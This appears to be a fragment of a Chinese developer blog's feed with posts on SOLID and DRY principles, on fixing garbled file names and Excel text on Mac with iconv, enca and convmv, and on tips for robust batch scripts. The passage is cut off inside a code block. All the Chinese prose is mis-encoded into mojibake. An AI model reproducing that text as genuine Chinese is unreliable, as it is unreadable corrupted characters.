å•ä¸€åŠŸèƒ½åŸåˆ™</h4><blockquote><p><em>æ¯ä¸ªæ¨¡å—æˆ–è€…ç±»åªåº”è¯¥æœ‰ä¸€é¡¹åŠŸèƒ½ã€‚</em></p></blockquote><p>ç†è®ºä¸Šè®²ï¼Œè¿™ä½¿ä»£ç æ›´å¥å£®ï¼Œæ›´å®¹æ˜“æ›´æ”¹ã€‚çŸ¥é“æ­£åœ¨æ›´æ”¹çš„ç»„ä»¶åªæœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œè¿™æ„å‘³ç€æµ‹è¯•æ›´æ”¹æ›´å®¹æ˜“ã€‚</p><h4 id="2-2-å¼€é—­åŸåˆ™"><a href="#2-2-å¼€é—­åŸåˆ™" class="headerlink" title="2.2 å¼€é—­åŸåˆ™"></a>2.2 å¼€é—­åŸåˆ™</h4><blockquote><p><em>è½¯ä»¶ä¸­çš„å¯¹è±¡ï¼ˆç±»ï¼Œæ¨¡å—ï¼Œå‡½æ•°ç­‰ç­‰ï¼‰åº”è¯¥å¯¹äºæ‰©å±•æ˜¯å¼€æ”¾çš„ï¼Œä½†æ˜¯å¯¹äºä¿®æ”¹æ˜¯å°é—­çš„ï¼Œè¿™æ„å‘³ç€ä¸€ä¸ªå®ä½“æ˜¯å…è®¸åœ¨ä¸æ”¹å˜å®ƒçš„æºä»£ç çš„å‰æä¸‹å˜æ›´å®ƒçš„è¡Œä¸ºã€‚</em></p></blockquote><h4 id="2-3-é‡Œæ°æ›¿æ¢åŸåˆ™"><a href="#2-3-é‡Œæ°æ›¿æ¢åŸåˆ™" class="headerlink" title="2.3 é‡Œæ°æ›¿æ¢åŸåˆ™"></a>2.3 é‡Œæ°æ›¿æ¢åŸåˆ™</h4><blockquote><p><em>å­ç±»å¯¹è±¡å¯ä»¥åœ¨ç¨‹å¼ä¸­ä»£æ›¿å…¶åŸºç±»ï¼ˆè¶…ç±»ï¼‰å¯¹è±¡</em></p></blockquote><h4 id="2-4-æ¥å£éš”ç¦»åŸåˆ™"><a href="#2-4-æ¥å£éš”ç¦»åŸåˆ™" class="headerlink" title="2.4 æ¥å£éš”ç¦»åŸåˆ™"></a>2.4 æ¥å£éš”ç¦»åŸåˆ™</h4><blockquote><p><em>æ¥å£åº”æä¾›ç»™å®¢æˆ·ç«¯ä»…éœ€å¿…éœ€ä¿¡æ¯ã€‚</em></p></blockquote><p>æ¥å£éš”ç¦»åŸåˆ™(ISP)æ‹†åˆ†éå¸¸åºå¤§è‡ƒè‚¿çš„æ¥å£æˆä¸ºæ›´å°çš„å’Œæ›´å…·ä½“çš„æ¥å£ï¼Œè¿™æ ·å®¢æˆ·å°†ä¼šåªéœ€è¦çŸ¥é“ä»–ä»¬éœ€è¦çš„æ–¹æ³•ã€‚æ¥å£éš”ç¦»åŸåˆ™çš„ç›®çš„æ˜¯ç³»ç»Ÿè§£å¼€è€¦åˆï¼Œä»è€Œå®¹æ˜“é‡æ„ï¼Œæ›´æ”¹å’Œé‡æ–°éƒ¨ç½²ã€‚</p><h4 id="2-5-ä¾èµ–åè½¬åŸåˆ™"><a href="#2-5-ä¾èµ–åè½¬åŸåˆ™" class="headerlink" title="2.5 ä¾èµ–åè½¬åŸåˆ™"></a>2.5 ä¾èµ–åè½¬åŸåˆ™</h4><p>é«˜å±‚æ¬¡çš„æ¨¡å—ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¬¡çš„æ¨¡å—ï¼Œä¸¤è€…å‡åº”ä¾èµ–äºæŠ½è±¡æ¥å£ã€‚<br>æŠ½è±¡æ¥å£ä¸åº”ä¾èµ–äºå…·ä½“å®ç°ï¼Œè€Œåº”å…·ä½“å®ç°ä¾èµ–äºæŠ½è±¡æ¥å£</p><h3 id="3-DRY"><a href="#3-DRY" class="headerlink" title="3. DRY"></a>3. DRY</h3><blockquote><p><em>ç³»ç»Ÿä¸­ï¼Œæ¯ä¸€å—çŸ¥è¯†éƒ½å¿…é¡»æ˜¯å•ä¸€ã€æ˜ç¡®è€Œæƒå¨çš„ã€‚</em></p></blockquote><p>è¿™ä¸ªåŸåˆ™æ—¨åœ¨å¸®åŠ©å¼€å‘äººå‘˜å‡å°‘ä»£ç çš„é‡å¤æ€§ï¼Œå¹¶å°†å…¬å…±ä»£ç ä¿å­˜åœ¨ä¸€ä¸ªåœ°æ–¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mac ä¸‹è§£å‹ä¸ Excel ä¹±ç è§£å†³æ–¹æ¡ˆ</title>
      <link href="/post/extract-excel-garbled-on-mac/"/>
      <url>/post/extract-excel-garbled-on-mac/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g25mhnmgeij30g204qdhb.jpg" alt=""></p><a id="more"></a><h1 id="è§£å‹æ–‡ä»¶ä¹±ç "><a href="#è§£å‹æ–‡ä»¶ä¹±ç " class="headerlink" title="è§£å‹æ–‡ä»¶ä¹±ç "></a>è§£å‹æ–‡ä»¶ä¹±ç </h1><p>Mac ç³»ç»Ÿé»˜è®¤çš„è§£å‹è½¯ä»¶æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„ Archive Utilityï¼Œä½†è¿™ä¸ªè½¯ä»¶å¯¹äºæ–‡ä»¶çš„ç¼–ç æ–¹å¼è¯†åˆ«æœ‰é—®é¢˜ï¼Œä½¿ç”¨ The Unarchiver å°±å¯ä»¥å®Œç¾è§£å†³ã€‚åœ¨ä»»ä¸€çš„å‹ç¼©æ–‡ä»¶å³é”®æŸ¥çœ‹ç®€ä»‹ï¼ˆGet Infoï¼‰=&gt; æ‰“å¼€æ–¹å¼ =&gt; é€‰æ‹©The Unarchiver =&gt; åº”ç”¨å…¨éƒ¨ï¼Œå³å¯å°† The Unarchiver è®¾ç½®ä¸ºé»˜è®¤çš„è§£å‹è½¯ä»¶ã€‚</p><img src="https://ws3.sinaimg.cn/middle/006tNc79ly1g25qtlxfemj30ek0iq75p.jpg" height="70%"><h1 id="Excel-å†…å®¹ä¹±ç "><a href="#Excel-å†…å®¹ä¹±ç " class="headerlink" title="Excel å†…å®¹ä¹±ç "></a>Excel å†…å®¹ä¹±ç </h1><p>èœå•æ Excel =&gt; Preferences =&gt; East Asian Languages =&gt; Select a language =&gt; Simplified Chines</p><p><img src="https://ws3.sinaimg.cn/middle/006tNc79ly1g25mszawekj30k00c775f.jpg" alt=""></p><h1 id="ã€è½¬ã€‘æ–‡ä»¶è½¬ç "><a href="#ã€è½¬ã€‘æ–‡ä»¶è½¬ç " class="headerlink" title="ã€è½¬ã€‘æ–‡ä»¶è½¬ç "></a>ã€è½¬ã€‘æ–‡ä»¶è½¬ç </h1><h2 id="æŸ¥çœ‹æ–‡ä»¶ç¼–ç "><a href="#æŸ¥çœ‹æ–‡ä»¶ç¼–ç " class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ç¼–ç "></a>æŸ¥çœ‹æ–‡ä»¶ç¼–ç </h2><p>åœ¨Linuxä¸­æŸ¥çœ‹æ–‡ä»¶ç¼–ç å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><h3 id="1-åœ¨Vimä¸­å¯ä»¥ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ç¼–ç "><a href="#1-åœ¨Vimä¸­å¯ä»¥ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ç¼–ç " class="headerlink" title="1. åœ¨Vimä¸­å¯ä»¥ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ç¼–ç "></a>1. åœ¨Vimä¸­å¯ä»¥ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ç¼–ç </h3><p><code>:set fileencoding</code><br>å³å¯æ˜¾ç¤ºæ–‡ä»¶ç¼–ç æ ¼å¼ã€‚å¦‚æœä½ åªæ˜¯æƒ³æŸ¥çœ‹å…¶å®ƒç¼–ç æ ¼å¼çš„æ–‡ä»¶æˆ–è€…æƒ³è§£å†³ç”¨VimæŸ¥çœ‹æ–‡ä»¶ä¹±ç çš„é—®é¢˜ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨ <code>~/.vimrc</code> æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š<br><code>set encoding=utf-8 fileencodings=ucs-bom,utf-8,cp936</code><br>è¿™æ ·ï¼Œå°±å¯ä»¥è®©vimè‡ªåŠ¨è¯†åˆ«æ–‡ä»¶ç¼–ç ï¼ˆå¯ä»¥è‡ªåŠ¨è¯†åˆ«UTF-8æˆ–è€…GBKç¼–ç çš„æ–‡ä»¶ï¼‰ï¼Œå…¶å®å°±æ˜¯ä¾ç…§ fileencodings æä¾›çš„ç¼–ç åˆ—è¡¨å°è¯•ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ç¼–ç ï¼Œå°±ç”¨latin-1(ASCII)ç¼–ç æ‰“å¼€ã€‚</p><h3 id="2-enca-æŸ¥çœ‹æ–‡ä»¶ç¼–ç "><a href="#2-enca-æŸ¥çœ‹æ–‡ä»¶ç¼–ç " class="headerlink" title="2. enca æŸ¥çœ‹æ–‡ä»¶ç¼–ç "></a>2. enca æŸ¥çœ‹æ–‡ä»¶ç¼–ç </h3><p>(å¦‚æœä½ çš„ç³»ç»Ÿä¸­æ²¡æœ‰å®‰è£…è¿™ä¸ªå‘½ä»¤ï¼Œå¯ä»¥ç”¨<code>sudo yum install -y enca</code>å®‰è£… )<br>Mac ä¸‹å¯ä»¥ç”¨ brew å®‰è£…<br><code>sudo brew install enca</code><br>æŸ¥çœ‹å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ enca filename</span><br><span class="line">filename: Universal transformation <span class="built_in">format</span> <span class="number">8</span> bits; UTF<span class="number">-8</span> <span class="literal">CRLF</span> <span class="built_in">line</span> terminators</span><br></pre></td></tr></table></figure><p>éœ€è¦è¯´æ˜ä¸€ç‚¹çš„æ˜¯ï¼Œencaå¯¹æŸäº›GBKç¼–ç çš„æ–‡ä»¶è¯†åˆ«çš„ä¸æ˜¯å¾ˆå¥½ï¼Œè¯†åˆ«æ—¶ä¼šå‡ºç°ï¼š<code>Unrecognized encoding</code></p><h3 id="3-æŸ¥çœ‹æ–‡ä»¶ç¼–ç -file-å‘½ä»¤"><a href="#3-æŸ¥çœ‹æ–‡ä»¶ç¼–ç -file-å‘½ä»¤" class="headerlink" title="3. æŸ¥çœ‹æ–‡ä»¶ç¼–ç  file å‘½ä»¤"></a>3. æŸ¥çœ‹æ–‡ä»¶ç¼–ç  file å‘½ä»¤</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file ip.txt</span><br><span class="line">ip.txt: UTF<span class="number">-8</span> Unicode <span class="type">text</span>, <span class="keyword">with</span> <span class="keyword">escape</span> <span class="keyword">sequences</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ç¼–ç è½¬æ¢"><a href="#æ–‡ä»¶ç¼–ç è½¬æ¢" class="headerlink" title="æ–‡ä»¶ç¼–ç è½¬æ¢"></a>æ–‡ä»¶ç¼–ç è½¬æ¢</h2><h3 id="1-åœ¨Vimä¸­ç›´æ¥è½¬æ¢æ–‡ä»¶ç¼–ç "><a href="#1-åœ¨Vimä¸­ç›´æ¥è½¬æ¢æ–‡ä»¶ç¼–ç " class="headerlink" title="1. åœ¨Vimä¸­ç›´æ¥è½¬æ¢æ–‡ä»¶ç¼–ç "></a>1. åœ¨Vimä¸­ç›´æ¥è½¬æ¢æ–‡ä»¶ç¼–ç </h3><p><code>:set fileencoding=utf-8</code> //å°†ä¸€ä¸ªæ–‡ä»¶è½¬æ¢æˆutf-8æ ¼å¼</p><h3 id="2-enconv-è½¬æ¢æ–‡ä»¶ç¼–ç "><a href="#2-enconv-è½¬æ¢æ–‡ä»¶ç¼–ç " class="headerlink" title="2. enconv è½¬æ¢æ–‡ä»¶ç¼–ç "></a>2. enconv è½¬æ¢æ–‡ä»¶ç¼–ç </h3><p><code>enconv -L zh_CN -x UTF-8 filename</code> // å°†ä¸€ä¸ªGBKç¼–ç çš„æ–‡ä»¶è½¬æ¢æˆUTF-8ç¼–ç </p><h3 id="3-iconv-è½¬æ¢ï¼Œiconvçš„å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š"><a href="#3-iconv-è½¬æ¢ï¼Œiconvçš„å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š" class="headerlink" title="3. iconv è½¬æ¢ï¼Œiconvçš„å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š"></a>3. iconv è½¬æ¢ï¼Œiconvçš„å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š</h3><p><code>iconv -f encoding -t encoding inputfile</code></p><p>æ¯”å¦‚å°†ä¸€ä¸ªUTF-8 ç¼–ç çš„æ–‡ä»¶è½¬æ¢æˆGBKç¼–ç <br><code>iconv -f UTF-8 -t GBK file1 -o file2</code></p><h4 id="ä¸€ã€åˆ©ç”¨iconvå‘½ä»¤è¿›è¡Œç¼–ç è½¬æ¢æ–‡ä»¶å†…å®¹ç¼–ç è½¬æ¢"><a href="#ä¸€ã€åˆ©ç”¨iconvå‘½ä»¤è¿›è¡Œç¼–ç è½¬æ¢æ–‡ä»¶å†…å®¹ç¼–ç è½¬æ¢" class="headerlink" title="ä¸€ã€åˆ©ç”¨iconvå‘½ä»¤è¿›è¡Œç¼–ç è½¬æ¢æ–‡ä»¶å†…å®¹ç¼–ç è½¬æ¢"></a>ä¸€ã€åˆ©ç”¨iconvå‘½ä»¤è¿›è¡Œç¼–ç è½¬æ¢æ–‡ä»¶å†…å®¹ç¼–ç è½¬æ¢</h4><p>iconvå‘½ä»¤ç”¨äºè½¬æ¢æŒ‡å®šæ–‡ä»¶çš„ç¼–ç ï¼Œé»˜è®¤è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼Œäº¦å¯æŒ‡å®šè¾“å‡ºæ–‡ä»¶ã€‚æŸ¥äº†ä¸‹iconvå‘½ä»¤ç”¨æ³•å¦‚ä¸‹ï¼š<br><code>iconv [é€‰é¡¹...] [æ–‡ä»¶...]</code><br>æœ‰å¦‚ä¸‹é€‰é¡¹å¯ç”¨:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥/è¾“å‡ºæ ¼å¼è§„èŒƒï¼š</span><br><span class="line"><span class="deletion">-f, --from-code=åç§° åŸå§‹æ–‡æœ¬ç¼–ç </span></span><br><span class="line"><span class="deletion">-t, --to-code=åç§° è¾“å‡ºç¼–ç </span></span><br><span class="line"></span><br><span class="line">ä¿¡æ¯ï¼š</span><br><span class="line"><span class="deletion">-l, --list åˆ—ä¸¾æ‰€æœ‰å·²çŸ¥çš„å­—ç¬¦é›†</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºæ§åˆ¶ï¼š</span><br><span class="line"><span class="deletion">-c ä»è¾“å‡ºä¸­å¿½ç•¥æ— æ•ˆçš„å­—ç¬¦</span></span><br><span class="line"><span class="deletion">-o, --output=FILE è¾“å‡ºæ–‡ä»¶</span></span><br><span class="line"><span class="deletion">-s, --silent å…³é—­è­¦å‘Š</span></span><br><span class="line"><span class="deletion">--verbose æ‰“å°è¿›åº¦ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p>ä¾‹å­:<br><code>iconv -f utf-8 -t gb2312 aaa.txt &gt; bbb.txt</code><br>è¿™ä¸ªå‘½ä»¤è¯»å–aaa.txtæ–‡ä»¶ï¼Œä»utf-8ç¼–ç è½¬æ¢ä¸ºgb2312ç¼–ç ,å…¶è¾“å‡ºå®šå‘åˆ°bbb.txtæ–‡ä»¶ã€‚</p><h4 id="äºŒã€æ–‡ä»¶åç¼–ç è½¬æ¢"><a href="#äºŒã€æ–‡ä»¶åç¼–ç è½¬æ¢" class="headerlink" title="äºŒã€æ–‡ä»¶åç¼–ç è½¬æ¢"></a>äºŒã€æ–‡ä»¶åç¼–ç è½¬æ¢</h4><p>å› ä¸ºç°åœ¨ç”¨Linuxï¼ŒåŸæ¥åœ¨Windowsé‡Œçš„æ–‡ä»¶éƒ½æ˜¯ç”¨GBKç¼–ç çš„ã€‚æ‰€ä»¥copyåˆ°linuxä¸‹æ˜¯ä¹±ç ï¼Œæ–‡ä»¶å†…å®¹å¯ä»¥ç”¨<code>iconv</code>æ¥è½¬æ¢ï¼Œå¯æ˜¯å¥½å¤šä¸­æ–‡çš„æ–‡ä»¶åè¿˜æ˜¯ä¹±ç ï¼Œæ‰¾åˆ°ä¸ªå¯ä»¥è½¬æ¢æ–‡ä»¶åç¼–ç çš„å‘½ä»¤ï¼Œå°±æ˜¯<code>convmv</code>ã€‚<br>convmvå‘½ä»¤è¯¦ç»†å‚æ•° ä¾‹å¦‚<br><code>convmv -f GBK -t UTF-8 *.mp3</code><br>ä¸è¿‡è¿™ä¸ªå‘½ä»¤ä¸ä¼šç›´æ­£çš„è½¬æ¢ï¼Œä½ å¯ä»¥çœ‹åˆ°è½¬æ¢å‰åçš„å¯¹æ¯”ã€‚å¦‚æœè¦ç›´æ­£çš„è½¬æ¢è¦åŠ ä¸Šå‚æ•° <code>--notest</code><br><code>convmv -f GBK -t UTF-8 --notest *.mp3</code><br><code>-f</code> å‚æ•°æ˜¯æŒ‡å‡ºè½¬æ¢å‰çš„ç¼–ç ï¼Œ-t æ˜¯è½¬æ¢åçš„ç¼–ç ã€‚è¿™ä¸ªåƒä¸‡ä¸è¦å¼„é”™äº†ã€‚ä¸ç„¶å¯èƒ½è¿˜æ˜¯ä¹±ç å“¦ã€‚è¿˜æœ‰ä¸€ä¸ªå‚æ•°å¾ˆæœ‰ç”¨ã€‚å°±æ˜¯ <code>-r</code> è¿™ä¸ªè¡¨ç¤ºé€’å½’è½¬æ¢å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•ã€‚</p><p>Linux éœ€è¦å®‰è£… convmv-1.10-1.el5.noarch.rpm</p><p>Mac ä¸‹ç”¨brew å®‰è£…<code>sudo brew install convmv</code></p><h4 id="ä¸‰ã€æ›´å¥½çš„å‚»ç“œå‹å‘½ä»¤è¡Œå·¥å…·enca"><a href="#ä¸‰ã€æ›´å¥½çš„å‚»ç“œå‹å‘½ä»¤è¡Œå·¥å…·enca" class="headerlink" title="ä¸‰ã€æ›´å¥½çš„å‚»ç“œå‹å‘½ä»¤è¡Œå·¥å…·enca"></a>ä¸‰ã€æ›´å¥½çš„å‚»ç“œå‹å‘½ä»¤è¡Œå·¥å…·enca</h4><p>å®ƒä¸ä½†èƒ½æ™ºèƒ½çš„è¯†åˆ«æ–‡ä»¶çš„ç¼–ç ï¼Œè€Œä¸”è¿˜æ”¯æŒæˆæ‰¹è½¬æ¢ã€‚ ã€€ã€€</p><h5 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1.å®‰è£… ã€€ã€€"></a>1.å®‰è£… ã€€ã€€</h5><p><code>$sudo apt-get install enca</code><br>Mac ä¸‹ <code>sudo brew install enca</code></p><h4 id="2-æŸ¥çœ‹å½“å‰æ–‡ä»¶ç¼–ç "><a href="#2-æŸ¥çœ‹å½“å‰æ–‡ä»¶ç¼–ç " class="headerlink" title="2.æŸ¥çœ‹å½“å‰æ–‡ä»¶ç¼–ç "></a>2.æŸ¥çœ‹å½“å‰æ–‡ä»¶ç¼–ç </h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enca -L zh_CN ip.txt     </span><br><span class="line">Simplified Chinese <span class="type">National</span> Standard; GB2312     </span><br><span class="line">Surrounded <span class="keyword">by</span>/intermixed <span class="keyword">with</span> non-<span class="type">text</span> data  ã€€ã€€</span><br><span class="line">`</span><br></pre></td></tr></table></figure><h5 id="3-è½¬æ¢"><a href="#3-è½¬æ¢" class="headerlink" title="3.è½¬æ¢ ã€€ã€€"></a>3.è½¬æ¢ ã€€ã€€</h5><p>å‘½ä»¤æ ¼å¼å¦‚ä¸‹ ã€€ã€€<br><code>$enca -L å½“å‰è¯­è¨€ -x ç›®æ ‡ç¼–ç  æ–‡ä»¶å</code><br>-L zh_CN ä¸€èˆ¬ä¹Ÿå¯ä»¥ä¸ç”¨æŒ‡å®šã€‚</p><p>ä¾‹å¦‚è¦æŠŠå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½è½¬æˆutf-8 ã€€ã€€<br><code>enca -L zh_CN -x utf-8 *</code> æˆ– <code>enca -x utf-8 *</code></p><p>æ£€æŸ¥æ–‡ä»¶çš„ç¼–ç ã€€<br><code>enca -L zh_CN file</code></p><p>å°†æ–‡ä»¶ç¼–ç è½¬æ¢ä¸ºâ€UTF-8â€ç¼–ç ã€€<br><code>enca -L zh_CN -x UTF-8 file</code></p><p>å¦‚æœä¸æƒ³è¦†ç›–åŸæ–‡ä»¶å¯ä»¥è¿™æ ·<br><code>enca -L zh_CN -x UTF-8 &lt; file1 &gt; file2</code></p><hr><p>Reference</p><ol><li><a href="https://www.zhihu.com/question/20562901/answer/138922102" target="_blank" rel="noopener">Office for Mac æ‰“å¼€ Excel æ–‡ä»¶å…¨æ˜¯ä¹±ç </a></li><li><a href="https://segmentfault.com/a/1190000007073776" target="_blank" rel="noopener">Linuxï¼ˆMacï¼‰ä¸‹æŸ¥çœ‹æ–‡ä»¶ç¼–ç åŠä¿®æ”¹ç¼–ç </a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è„šæœ¬ä¹¦å†™åŠæ‰§è¡Œæ³¨æ„äº‹é¡¹</title>
      <link href="/post/script-notes/"/>
      <url>/post/script-notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87cq9pnx6j30mu0cu75u.jpg" alt=""></p><p>æ€æ ·å†™å‡ºå¥å£®å‹å¥½çš„è„šæœ¬ï¼Ÿ</p><a id="more"></a><p>å·¥ä½œä¸­ç»å¸¸ä¼šå†™ä¸€äº›è„šæœ¬æ¥æ‰¹é‡å¤„ç†ä¸€äº›æ•°æ®ï¼Œæœ‰æ—¶ä¸€ä¸ªè„šæœ¬çš„æ‰§è¡Œæ—¶é—´å¯èƒ½é•¿è¾¾æ•°å°æ—¶ï¼Œè€Œä¸”ä¸­é—´éšæ—¶å¯èƒ½å‡ºé”™ä¸­æ–­ï¼Œè¿™å¯èƒ½æ˜¯è„šæœ¬å¯¹æŸäº›æƒ…å†µè€ƒè™‘ä¸å¤Ÿå…¨é¢ï¼Œä¹Ÿå¯èƒ½æ˜¯è„æ•°æ®çš„é—®é¢˜ã€‚é‚£ä¹ˆï¼Œå¦‚ä½•æ‰èƒ½å†™å‡ºå¥å£®çš„è„šæœ¬ï¼Œè®©æ•´ä¸ªä»»åŠ¡ä¸€æ°”å‘µæˆå‘¢ï¼Ÿä»¥ä¸‹å°±æ ¹æ®æˆ‘ä¸°(cai)å¯Œ(guo)çš„(de)ç»(keng)éªŒæ¥è°ˆä¸€è°ˆã€‚</p><ol><li><strong>æ•°æ®å¤‡ä»½</strong>ã€‚é¿å…è„šæœ¬å¼‚å¸¸æ‰§è¡Œæ‰€å¯¼è‡´æ•°æ®æ— æ³•æ¢å¤ã€‚</li><li><strong>å¼‚å¸¸å¤„ç†</strong>ã€‚å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è§†æƒ…å†µå†³å®šæ˜¯ç»ˆæ­¢è„šæœ¬ï¼Œè¿˜æ˜¯è®°å½•å¤±è´¥çš„æ•°æ®ç»§ç»­æ‰§è¡Œï¼Œä½†æ— è®ºå“ªç§æ–¹å¼ï¼Œéƒ½éœ€è¦è®°å½•å‘ç”Ÿå¼‚å¸¸çš„ä½ç½®å’Œä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œä¾¿äºå¿«é€Ÿå®šä½é—®é¢˜ï¼Œå¹¶åœ¨ä¿®å¤é—®é¢˜åç»§ç»­æ‰§è¡Œã€‚å°¤å…¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›æ•°æ®äºŒæ¬¡æ‰§è¡Œä¼šå¼•å‘é—®é¢˜ï¼Œå› æ­¤æ­£ç¡®è®°å½•å¼‚å¸¸ä½ç½®ï¼Œå®ç°â€œæ–­ç‚¹ç»­ä¼ â€éå¸¸é‡è¦</li><li><strong>æ—¥å¿—è®°å½•</strong>ã€‚å¯¹äºè¢«æ‰§è¡Œçš„å†…å®¹éœ€è¦è¯¦ç»†çš„è®°å½•ï¼Œè¿™æ ·å¯ä»¥åœ¨å‘ç”Ÿå¼‚å¸¸æˆ–è€…åœ¨è„šæœ¬ç»“æŸæ—¶æŸ¥çœ‹æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ—¥å¿—è®°å½•æ˜¯è¿½åŠ è€Œä¸æ˜¯è¦†å†™ï¼Œè€Œä¸”è¦æ³¨æ„æ—¥å¿—çš„æ¢è¡Œã€‚</li><li><strong>ç»Ÿè®¡ä¿¡æ¯</strong>ã€‚è®°å½•è„šæœ¬çš„å¼€å§‹ã€ç»“æŸæ—¶é—´ï¼Œå†…å­˜æ¶ˆè€—æƒ…å†µï¼Œä»¥åŠæ‰§è¡Œç»Ÿè®¡ä¿¡æ¯ï¼Œå¦‚ï¼šå…±éœ€æ‰§è¡Œmæ¡æ•°æ®ï¼ŒæˆåŠŸæ‰§è¡Œnæ¡ï¼Œæ‰§è¡Œå¤±è´¥xæ¡ï¼Œæ‰§è¡Œæ€»è€—æ—¶yç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥æ ¹æ®ç»Ÿè®¡ä¿¡æ¯åœ¨è„šæœ¬å¥å£®æ‰§è¡Œåå†è¿›ä¸€æ­¥ä¼˜åŒ–</li><li><strong>è„šæœ¬æµ‹è¯•</strong>ã€‚åœ¨çœŸå®æ•°æ®æ‰§è¡Œå‰ï¼Œä¸€å®šè¦å…ˆåœ¨ mock æ•°æ®ä¸ŠéªŒè¯ä¸€ä¸‹è„šæœ¬ï¼Œæœ‰æ—¶æ•°æ®é‡çš„ä¸åŒä¹Ÿä¼šå¯¼è‡´è„šæœ¬æ‰§è¡Œå¼‚å¸¸ï¼Œæ‰€ä»¥ mock æ•°æ®é‡ä¹Ÿè¦æ¥è¿‘çœŸå®ç¯å¢ƒ</li><li><strong>ç»“æœé€šçŸ¥</strong>ã€‚æ‰§è¡Œå®Œæˆé€šè¿‡é‚®ä»¶ç­‰æ–¹å¼é€šçŸ¥ï¼Œä¸å¿…ä¸€ç›´ç›¯ç€è„šæœ¬</li><li><strong>Server æ‰§è¡Œ</strong>ã€‚æœåŠ¡å™¨ç›¸æ¯”ä¸ªäººç”µè„‘æ€§èƒ½å’Œç½‘ç»œæ–¹é¢ç­‰æ›´æœ‰ä¼˜åŠ¿ï¼Œæ‰§è¡Œç¯å¢ƒæ›´å¿«ã€æ›´ç¨³å®šã€‚ä¹‹å‰æˆ‘ä¸€ä¸ªè„šæœ¬ Mac æ‰§è¡Œ20åˆ†é’Ÿï¼ŒServer æ‰§è¡Œ2åˆ†é’ŸğŸ˜‚</li><li><strong>ä¼šè¯ä¿æŒ</strong>ã€‚ä½¿ç”¨<code>screen</code>æˆ–è€…<code>tmux</code>ï¼Œè¿œç¨‹ç™»å½•æœåŠ¡å™¨ ==&gt; åˆ›å»ºä¼šè¯ ==&gt; ä¼šè¯åˆ†ç¦» ==&gt; é€€å‡ºæœåŠ¡å™¨ ==&gt; do somethin ==&gt; æ”¶åˆ°ç»“æœé€šçŸ¥ ==&gt; é‡æ–°ç™»å½•æœåŠ¡å™¨ ==&gt; ä¼šè¯æ¢å¤ ==&gt; æŸ¥çœ‹æ‰§è¡Œç»“æœ</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 